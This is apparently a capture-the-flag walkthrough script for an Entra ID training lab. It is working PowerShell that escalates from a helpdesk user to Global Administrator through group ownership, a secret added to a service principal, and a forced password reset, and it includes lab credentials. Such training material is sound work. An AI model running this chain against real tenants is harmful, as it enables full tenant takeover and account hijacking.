<#
.SYNOPSIS
EntraGoat Scenario 3: Walkthrough solution step-by-step
This can be done 100% from the UI as well, this script just automates the process

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 3 - Group Ownership Privilege Escalation Chain
Group-Ownership -> App Admin -> SP -> PAA -> GA

Attack flow: 

1. The attacker starts as a low-privileged IT support user (Michael Chen).
Through a misconfiguration, this user owns a security group that has been assigned the Application Administrator role.

2. Since group owners can manage group membership, the attacker adds themselves to the group.
No approval needed - group ownership means full control over membership. Now they have App Admin privileges.

3. With App Admin role, the attacker can manage ALL application registrations and service principals in the tenant.
This includes adding credentials to any service principal - a powerful capability often overlooked.

4. The attacker discovers a service principal that's a member of another group with Privileged Authentication Administrator (PAA) role.
This creates a privilege escalation chain: Group Owner -> App Admin -> SP -> PAA.

5. The attacker adds credentials to this SP and authenticates as it.

6. Using these privileges, the attacker resets the Global Administrator's password.
PAA can reset passwords for any user, including Global Admins.

7. The attacker logs in as the Global Administrator and retrieves the flag.
Complete tenant compromise achieved through a chain of legitimate but misconfigured permissions.

- - - 

--> So... why this works?
This attack exploits several common misconfigurations and oversight issues:

1. Group Ownership is Powerful: Many organizations don't realize that group owners have full control over membership.
   When these groups have privileged roles, ownership becomes a backdoor to those privileges.

2. Role-Assignable Groups: The ability to assign roles to groups is convenient but dangerous.
   It creates indirect paths to privileges that are harder to audit and track.

3. Application Administrator Scope: This role can manage ALL applications, not just owned ones.
   It's often given out thinking it's limited, but it's actually extremely powerful.

4. Service Principal Group Membership: SPs can be members of groups with roles, creating non-obvious privilege paths.
   Many admins focus on user memberships and forget about service principals - the function Get-MgGroupMember doesn't even show SPs on v1.0

Common scenarios where this happens:
- IT support teams given group ownership for "self-service" management
- Old service principals added to admin groups and forgotten
- Role-assignable groups created without proper governance
- Application Administrator role given to development teams

The attack is particularly dangerous because:
- Each individual permission seems reasonable in isolation
- No single step triggers typical security alerts
- The privilege chain can be challenging to spot in large environments
- All actions use legitimate APIs and permissions
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>

$tenantId = "[YOUR-TENANT-ID]"
$UPN = "michael.chen@[YOUR-DOMAIN].onmicrosoft.com"
$password = "GoatAccess!123"

$tenantId = "7c5581d5-e976-489e-8055-b165cc12fa22"
$UPN = "michael.chen@334brf.onmicrosoft.com"
$password = "GoatAccess!123"

# quick wrapper to list all members of a group (handles SPs too - uses /beta)
# as Get-MgGroupMember doesn't show SPs on v1.0, so we use a direct API call instead
function Get-GroupMembers {
    param([string]$GroupId)
    return (Invoke-MgGraphRequest -Uri "/beta/groups/$GroupId/members" -Method GET).value
}

# return all groups a given identity owns and their roles
function Find-GroupsIOwn {
    param([string]$UserId)
    
    Write-Host "Enumerating all groups in the tenant..."
    $allGroups = Get-MgGroup -All -Property Id, DisplayName, Description, MailEnabled, SecurityEnabled, GroupTypes, IsAssignableToRole
    Write-Host "Found $($allGroups.Count) groups in tenant"
    
    $ownedGroups = @()
    $checkCount = 0
    
    foreach ($group in $allGroups) {
        $checkCount++
        if ($checkCount % 50 -eq 0) {
            Write-Host "Checked $checkCount/$($allGroups.Count) groups..."
        }
        try {
            $owners = Get-MgGroupOwner -GroupId $group.Id -ErrorAction Stop
            foreach ($owner in $owners) {
                if ($owner.Id -eq $UserId) {
                    # Get assigned roles if applicable
                    $assignedRoles = @()
                    if ($group.IsAssignableToRole) {
                        $assignedRoles = Get-GroupRoles -GroupId $group.Id
                    }

                    Write-Host "OWNED GROUP FOUND!" -ForegroundColor Red
                    Write-Host "   Name: $($group.DisplayName)" -ForegroundColor Yellow
                    Write-Host "   Group ID: $($group.Id)" -ForegroundColor Yellow
                    
                    if ($assignedRoles) {
                        Write-Host "   Assigned Roles: $($assignedRoles -join ', ')" -ForegroundColor DarkYellow
                    }

                    $ownedGroups += [PSCustomObject]@{
                        GroupID = $group.Id
                        DisplayName = $group.DisplayName
                        AssignedRoles = $assignedRoles
                    }
                    break  
                }
            }
        }
        catch {
            Write-Host "Error checking owners for group $($group.DisplayName): $_" -ForegroundColor DarkYellow
        }
    }
    return $ownedGroups
}

# helper function to get roles assigned to a group
function Get-GroupRoles {
    param([string]$GroupId)
    
    $roles = @()
    try {
        $assignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$GroupId'"
        foreach ($a in $assignments) {
            $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $a.RoleDefinitionId
            $roles += $roleDef.DisplayName
        }
    }
    catch {
        Write-Host "Error retrieving roles for group $GroupId : $_" -ForegroundColor DarkYellow
    }
    return $roles
}


# Step 1: Using BARK function for authentication as the low-privileged user
$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
$userAccessToken = $userToken.access_token
$SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureToken

Get-MgContext

$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser

# Step 2: Find all groups owned by current user
# $myGroups = Get-GroupsOwnedBy -OwnerId $currentUser.Id - just if we want to be fancy
# $myGroups | Format-Table 

$ownedGroups = Get-MgGroup -All | Where-Object {
    (Get-MgGroupOwner -GroupId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
}

$ownedGroups | Format-Table DisplayName, Id, IsAssignableToRole -AutoSize

# Check if any owned groups are role-assignable and have assigned roles
$roleGroups = $ownedGroups | Where-Object { $_.IsAssignableToRole -eq $true }

# we own IT Application Managers group! lets check what roles it has
$ITgroup = Get-MgGroup -Filter "displayName eq 'IT Application Managers'" 
$roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($ITgroup.Id)'" 
$roles | ForEach-Object { (Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName }

# if we owned many groups
# foreach ($group in $roleGroups) {
#     $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" | 
#              ForEach-Object { (Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName }
#     if ($roles) {
#         Write-Host "Group '$($group.DisplayName)' has roles: $($roles -join ', ')" -ForegroundColor Red
#     }
# }


# since we own the group, we can add ourselves to it
$memberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
}
New-MgGroupMemberByRef -GroupId $ITgroup.Id -BodyParameter $memberParams

# refresh the context to see the new group membership

Disconnect-MgGraph
$userAccessToken2 = (Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token
Connect-MgGraph -AccessToken (ConvertTo-SecureString $userAccessToken2 -AsPlainText -Force)

# you can use the parse-JWTToken cmdlet by BARK to see the new roles (wids) assigned to the user
parse-JWTToken $userToken.access_token
# VS
parse-JWTToken $userAccessToken2

# Step 4: Now that we're apart of an Application Administrator group, we can manage (== add secrets to) service principals - let's find interesting SPs! 

# Note: At this point the scenraio can be solved by adding a secret to any privilged SP in your tenant, 
# we will focus on the PAA & GA roles as the target is to escalate to GA and only PAA or GA roles can reset its password.

# lets find all SPs in the tenant that have PAA or GA roles assigned
# List every service-principal that holds GA or Priv-Auth-Admin
$roleMap = @{
    "62e90394-69f5-4237-9190-012177145e10" = "Global Administrator"
    "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" = "Privileged Authentication Administrator"
}

Get-MgRoleManagementDirectoryRoleAssignment -All |
  Where-Object { $roleMap.Keys -contains $_.RoleDefinitionId } |
  ForEach-Object  { Get-MgServicePrincipal -ServicePrincipalId $_.PrincipalId -ErrorAction SilentlyContinue } |
  Sort-Object Id -Unique |
  Select-Object DisplayName, AppId, Id

# But that's not all the SPs that have PAA or GA roles assigned, we need to check each group that has those roles for members that are SPs
# first we'll find all groups that have PAA or GA roles assigned
$allRoleGroups = Get-MgGroup -All -Filter "isAssignableToRole eq true"

$privilegedGroups = @()
foreach ($group in $allRoleGroups) {
    $roles = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($group.Id)'" |
             Select-Object -Expand RoleDefinitionId

    if ($roles -contains "62e90394-69f5-4237-9190-012177145e10") {
        Write-Host "$($group.DisplayName) has role: $($roleMap['62e90394-69f5-4237-9190-012177145e10'])" -ForegroundColor DarkYellow
        $privilegedGroups += $group
    }
    elseif ($roles -contains "7be44c8a-adaf-4e2a-84d6-ab2649e08a13") {
        Write-Host "$($group.DisplayName) has role: $($roleMap['7be44c8a-adaf-4e2a-84d6-ab2649e08a13'])" -ForegroundColor DarkYellow
        $privilegedGroups += $group
    }
}

# Find SP members in those groups
$targetSPs = @() 
foreach ($group in $privilegedGroups) {
    Write-Host "`n[+] Checking group: $($group.DisplayName)" -ForegroundColor Cyan
    $members = Get-GroupMembers -GroupId $group.Id
    
    $spMembers = $members | Where-Object { $_.'@odata.type' -eq '#microsoft.graph.servicePrincipal' }
    
    foreach ($sp in $spMembers) {
        Write-Host "   [!] Found service principal: $($sp.displayName)" -ForegroundColor Yellow
        Write-Host "       SP ID: $($sp.id)" -ForegroundColor DarkYellow
        Write-Host "       App ID: $($sp.appId)" -ForegroundColor DarkYellow
        
        $targetSPs += [PSCustomObject]@{
            Name = $sp.displayName
            SPId = $sp.id
            AppId = $sp.appId
            GroupName = $group.DisplayName
        }
    }
}

# depending on your environment, you may have many SPs with PAA or GA roles assigned. 
# We can simply pick the first one ($targetSPs[0]) but for the sake of the scenario, and to keep the same solution for all players, 
# we'll focus on the SP of "Identity Management Portal" since we know for sure its there (and we dont want to break any env)
$targetSP = $targetSPs | Where-Object { $_.Name -eq "Identity Management Portal" }


# Step 5: Add a secret to the SP and authenticate as it
$secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$passwordCredential = @{
    DisplayName = $secretDescription
    EndDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSP.SPId -PasswordCredential $passwordCredential

$clientSecret = $newSecret.SecretText # save it
$clientSecret

# Disconnect current session 
Disconnect-MgGraph

$secureSecret = ConvertTo-SecureString $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($targetSP.AppId, $secureSecret)
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Step 6: Find the target GA user and reset their password
$targetAdminUPN = "EntraGoat-admin-s3@" + ((Get-MgOrganization).VerifiedDomains | Where-Object IsDefault).Name
$adminUser = Get-MgUser -Filter "userPrincipalName eq '$targetAdminUPN'"
$adminUser

$newPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$newPassword
$passwordProfile = @{
    Password = $newPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $adminUser.Id -PasswordProfile $passwordProfile

Disconnect-MgGraph
# Step 7: Authenticate as GA and get flag

$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPassword -TenantID $tenantId
$adminAccessToken = $adminToken.access_token
$SecureAdminToken = ConvertTo-SecureString $adminAccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureAdminToken

# Verify admin authentication
Get-MgContext

# Retrieve flag to prove successful compromise
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

Disconnect-MgGraph